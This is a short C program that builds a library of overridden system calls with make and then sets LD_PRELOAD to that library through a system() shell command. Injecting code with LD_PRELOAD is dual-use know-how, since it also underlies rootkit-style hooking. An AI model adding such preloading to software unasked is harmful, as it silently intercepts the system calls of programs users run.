#include "overWrittenSysCalls.h"

// GLOBAL VARS-------------------------------------------------------------------------------------
char* owSysCallsMkFileLoc;
char* osSysCallsSharedObjLoc;

// Error Msg Constant Vars
char* F_LOADOWSYSCALLS = (char*) __FILE__;
//-------------------------------------------------------------------------------------------------

// INSTANTIATING GLOBAL VARS-----------------------------------------------------------------------
__attribute__((constructor)) void init_LOADOWSYSCALLS() {
	owSysCallsMkFileLoc = myFindPathC(289); //overWrittenSysCalls.mk
	osSysCallsSharedObjLoc= myFindPathC(216); //liboverWrittenSysCalls.so
}
__attribute__((destructor)) void deinit_LOADOWSYSCALLS() {
	free(owSysCallsMkFileLoc);
	free(osSysCallsSharedObjLoc);
}
//-------------------------------------------------------------------------------------------------

int main(){
	// Vars
	int returnVal;
	int commandLen = 0;
	char* command;

	// Getting Values
	commandLen = strlen(owSysCallsMkFileLoc) + strlen(osSysCallsSharedObjLoc) + 100;
	command = createStr(commandLen);
	strcat(command, "unset LD_PRELOAD; make -f ");
	strcat(command, owSysCallsMkFileLoc);
	strcat(command, "; export LD_PRELOAD=");
	strcat(command, osSysCallsSharedObjLoc);

	returnVal = system(command);
	free(command);
	
	return returnVal;
}
